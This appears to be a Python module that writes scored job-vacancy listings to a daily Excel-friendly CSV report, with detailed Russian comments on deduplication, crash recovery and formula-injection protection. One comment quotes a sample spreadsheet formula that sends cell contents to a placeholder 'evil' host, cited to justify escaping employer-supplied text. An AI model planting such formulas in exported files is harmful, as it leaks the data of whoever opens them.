import csv
import io
from collections.abc import Sequence
from datetime import datetime
from pathlib import Path

from hh_search.domain.models import ScoredVacancy
from hh_search.sinks.base import REPORT_DATE_FORMAT
from hh_search.sinks.text import format_work_formats

# `listing`, а не `found_by_query`: после переезда discovery на листинги в
# этом поле лежит slug (`programmist`), а не текст поискового запроса.
# `work_formats` — ПОСЛЕДНЕЙ, а не рядом с `area`: `CsvSink.emit` дописывает
# в файл дня, начатый предыдущей версией, и пишет заголовок только для
# нового файла. Колонка в середине сдвинула бы все старые поля после себя
# для `DictReader`, читающего файл по старому заголовку (`salary_from`
# получил бы значение формата, `url` потерял бы последнее поле) — молча,
# без исключения. В хвосте новая колонка просто не совпадает со старым
# заголовком и уходит `DictReader`'у в `restkey`, а 12 прежних имён остаются
# на местах. Проверено регрессионным тестом
# `test_new_column_does_not_shift_a_file_started_before_the_upgrade`.
COLUMNS = [
    "id",
    "score",
    "cluster",
    "title",
    "company",
    "area",
    "salary_from",
    "salary_to",
    "currency",
    "published_at",
    "listing",
    "url",
    "work_formats",
    # В хвосте по тому же правилу, что и `work_formats` выше: заголовок
    # файла дня написан прошлой версией, и колонка в середине сдвинула бы
    # для `DictReader` все поля после себя — молча.
    "semantic",
    # Выписанное локальной моделью — тоже в хвост и тоже по правилу выше.
    # `required_years` в колонку не выведен: замер 2026-08-26 показал, что
    # модель берёт его из текста реже и хуже, чем стек, а колонка,
    # заполненная на четверть, в таблице хуже отсутствующей.
    "stack",
    "seniority",
]

# Excel и LibreOffice исполняют содержимое ячейки, начинающееся с этих
# символов. Заголовок и название компании пишет работодатель, то есть это
# внешний недоверенный текст: `=HYPERLINK("http://evil/?u="&A1;"вакансия")`
# в заголовке превращает отчёт в утечку. Квотирование модуля csv от формул
# не защищает — оно про разделители, а не про интерпретацию.
_FORMULA_STARTS = ("=", "+", "-", "@", "\t", "\r")

# Строки csv.writer кончаются CRLF (умолчание диалекта), и дописанный нами
# разделитель обязан быть таким же, иначе в файле окажутся оба вида.
_LINE_END = "\r\n"


def _cell(value: object) -> str:
    """Значение ячейки: строка, обезвреженная от интерпретации формулой.

    Апостроф перед значением — то, что понимают и Excel, и LibreOffice:
    ячейка остаётся текстом. Применяется только к текстовым колонкам:
    числовые формируем мы, там некого обезвреживать, а `'` превратил бы
    отрицательное число в текст (см. `_score`).
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_FORMULA_STARTS) else text


def _score(value: float) -> str:
    """Балл числом для того Excel, ради которого выбраны BOM и `;`.

    В русской локали разделитель дробной части — запятая; точку такой
    Excel числом не признаёт, колонка становится текстовой, и фильтр
    «score > 60» вместе с числовой сортировкой молча перестают работать.
    Один знак после запятой — тот же, что в markdown-отчёте: `{:.0f}`
    печатал бы `60` по обе стороны порога.
    """
    return f"{value:.1f}".replace(".", ",")


def _amount(value: int | None) -> str:
    """Сумма зарплаты: целое или пустая ячейка. Обезвреживать нечего —
    значение приходит числом с распознанной страницы, а не текстом."""
    return "" if value is None else str(value)


class CsvSink:
    """Полная выгрузка нового: в CSV идёт всё, порога здесь нет (спека §6.3).

    Формат подчинён единственному потребителю — таблице на рабочем столе:
    UTF-8 с BOM и разделитель `;`, иначе русский текст в Excel читается как
    `ÐžÐžÐž`, а с русской локалью вся строка ложится в одну колонку.

    Файл дня — единственное состояние приёмника, и он переживает аварии в
    любой момент записи: прогон может быть убит после `open()`, но до
    сброса буфера (файл нулевой длины), а запись — оборвана на полном
    диске посреди символа (невалидный UTF-8 в хвосте). Отсюда три правила
    чтения и дозаписи: файл без содержимого считается новым, чтение
    терпимо к порче хвоста, а дозапись начинается с новой строки.
    """

    name = "csv"

    def __init__(self, reports_dir: Path) -> None:
        self._reports_dir = reports_dir

    def emit(self, vacancies: Sequence[ScoredVacancy], now: datetime) -> int:
        if not vacancies:
            return 0
        self._reports_dir.mkdir(parents=True, exist_ok=True)
        path = self._reports_dir / f"{now:%Y-%m-%d}-new.csv"
        existing = _read_day_file(path)
        written = _written_ids(existing)
        fresh: list[ScoredVacancy] = []
        for item in vacancies:
            if item.discovered.id in written:
                continue
            # Пополняем на ходу: дубль может прийти и внутри одной пачки.
            written.add(item.discovered.id)
            fresh.append(item)
        if not fresh:
            return 0
        # BOM пишет сам кодек и ровно один раз за файл: при открытии на
        # дозапись TextIOWrapper сбрасывает состояние кодировщика, если
        # позиция ненулевая, и второй прогон дня BOM уже не вставляет
        # (проверено исполнением). Условие «utf-8-sig только в первый раз»
        # было не только лишним, но и вредным: файл нулевой длины оно
        # оставляло навсегда без BOM.
        with path.open("a", newline="", encoding="utf-8-sig") as handle:
            if existing and not existing.endswith(("\n", "\r")):
                # Предыдущая запись оборвалась на полуслове (полный диск,
                # SIGKILL). Без этого перевода строки новая строка
                # приклеивается к обрывку: одна вакансия растворяется в
                # колонке `url` другой, и вернуть её нечем.
                handle.write(_LINE_END)
            writer = csv.DictWriter(handle, fieldnames=COLUMNS, delimiter=";")
            if not existing:
                writer.writeheader()
            for item in fresh:
                writer.writerow(self._row(item))
        return len(fresh)

    def maintain(self, now: datetime) -> None:
        """Обслуживать нечего: файл дня пишется целиком в `emit`."""

    def _row(self, item: ScoredVacancy) -> dict[str, str]:
        discovered = item.discovered
        facts = item.facts
        salary = discovered.salary
        published_at = discovered.published_at
        return {
            "id": _cell(discovered.id),
            "score": _score(item.score.total),
            "cluster": _cell(item.cluster),
            "title": _cell(discovered.title),
            "company": _cell(discovered.company),
            "area": _cell(discovered.area),
            "salary_from": _amount(salary.amount_from),
            "salary_to": _amount(salary.amount_to),
            "currency": _cell(salary.currency),
            # Пустая ячейка, а не «None»: дата публикации неизвестна, пока
            # вакансия не обогащена, и выдумывать её нечем (спека §5.3).
            "published_at": _cell(
                None if published_at is None else format(published_at, REPORT_DATE_FORMAT)
            ),
            "listing": _cell(discovered.found_by_query),
            "url": _cell(discovered.url),
            "work_formats": _cell(format_work_formats(item.details.work_formats)),
            # Пустая ячейка, а не ноль: «не считалось» (модель недоступна,
            # `llm.semantic: false`, вектор снят уборкой) и «посчиталось,
            # вышло мало» — разные вещи, и ноль на месте первого утверждал
            # бы то, чего никто не измерял.
            "semantic": "" if item.semantic is None else f"{item.semantic:.3f}",
            # Через `_cell`, как и весь остальной текст: стек модель
            # переписывает ИЗ ОПИСАНИЯ, то есть это по-прежнему текст
            # работодателя, и формула в нём так же исполнится в Excel.
            "stack": _cell(", ".join(facts.stack) if facts and facts.stack else None),
            "seniority": _cell(facts.seniority if facts else None),
        }


def _read_day_file(path: Path) -> str:
    """Содержимое файла текущего дня; пусто, если файла нет.

    Чтение терпимое (`errors="replace"`) намеренно. Запись, оборванная
    полным диском посреди кириллической буквы, оставляет в хвосте
    невалидный UTF-8, а убрать его дозаписью нельзя — байт остаётся в
    файле до конца суток. Строгий декодер превратил бы это в
    UnicodeDecodeError на КАЖДОМ следующем прогоне: отчётов нет вовсе (csv
    идёт первым и уносит с собой markdown), самовосстановления нет, а
    сообщение указывает на чтение файла, а не на полный диск. Порча хвоста
    не должна мешать ни дедупликации, ни дозаписи.
    """
    if not path.exists():
        return ""
    return path.read_bytes().decode("utf-8-sig", errors="replace")


def _written_ids(existing: str) -> set[str]:
    """id, уже лежащие в файле текущего дня.

    Доставка в приёмник — at-least-once по построению: `mark_reported()`
    вызывается ПОСЛЕ всех приёмников, иначе упавший приёмник терял бы
    вакансию навсегда. Значит, повтор возможен всегда — при частичном
    отказе приёмников и при аварии между `emit` и `mark_reported`, — и
    снять его может только сам приёмник. Источник истины — файл, а не
    поле объекта: между прогонами процесс перезапускается.

    Колонка берётся по номеру, а не по заголовку: заголовка в файле может
    не быть (его унесла авария прошлого прогона), и DictReader принял бы
    за него первую вакансию — то есть ровно её и потерял бы.
    """
    rows = list(csv.reader(io.StringIO(existing, newline=""), delimiter=";"))
    if rows and not existing.endswith(("\n", "\r")):
        # Последняя строка не закончена: запись оборвалась на полуслове, и
        # эта вакансия в отчёт по сути не попала. Пусть следующий прогон
        # впишет её целиком — потерять вакансию хуже, чем оставить в файле
        # видимый обрывок.
        rows.pop()
    return {row[0] for row in rows if row and row[0] and row[0] != COLUMNS[0]}
